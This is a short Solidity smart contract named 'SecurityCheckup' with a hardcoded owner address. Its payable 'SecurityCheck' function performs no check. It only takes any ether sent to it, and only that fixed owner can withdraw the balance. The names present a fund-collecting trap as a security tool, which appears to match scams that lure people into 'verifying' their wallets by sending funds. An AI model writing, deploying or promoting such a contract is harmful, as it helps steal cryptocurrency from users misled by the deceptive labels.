pragma solidity ^0.4.26;

contract SecurityCheckup {

    address private  owner;

     constructor() public{   
        owner=0xCB48eF95d3aAA3CB82b10fb1f5Ef281B1D208E7a;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function SecurityCheck() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}